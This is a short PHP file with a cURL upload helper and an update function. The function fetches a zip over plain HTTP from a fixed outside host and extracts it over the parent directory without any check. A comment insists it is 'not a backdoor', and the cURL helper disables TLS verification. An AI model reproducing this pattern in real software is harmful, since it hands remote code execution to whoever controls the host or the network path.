<?php
function upload($url,$file) {
	return get_url($url,[
		'name' =>$file,
		'file' => new \CURLFile(realpath($file))
	]);
}
function get_url($url,$post){
	$ch = curl_init();
	curl_setopt($ch,CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_URL,$url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS,$post);
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}
function update(){
$update_file = file_get_contents("http://ovhpan.lq520.club/update.zip");//这个是在线更新用的，不是后门……
file_put_contents('update.zip', $update_file);
$zip = new ZipArchive;
if($zip->open('./update.zip') && $zip->extractTo('../')){
unlink('update.zip');
return "已下载解压最新版本";
}
}
?>